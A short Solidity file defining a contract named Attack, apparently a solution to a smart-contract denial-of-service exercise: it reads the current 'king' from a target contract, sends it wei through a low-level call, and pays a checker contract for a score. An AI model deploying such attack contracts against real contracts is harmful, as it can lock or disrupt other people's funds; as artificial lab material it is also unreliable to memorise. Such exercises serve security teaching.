// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./dos.sol";
contract Attack{
    Check public check;
    ToCheck public tocheck;
    address public a;
    constructor(address payable addr1,address addr2) public {
        check = Check(addr1);
        a = address(check.king());
        tocheck = ToCheck(addr2);
    }
    function attack() public payable {
        a.call{value : 10 wei}("");
    }
    function getscore() public payable {
        tocheck.check{value : 20 wei}();
    }
}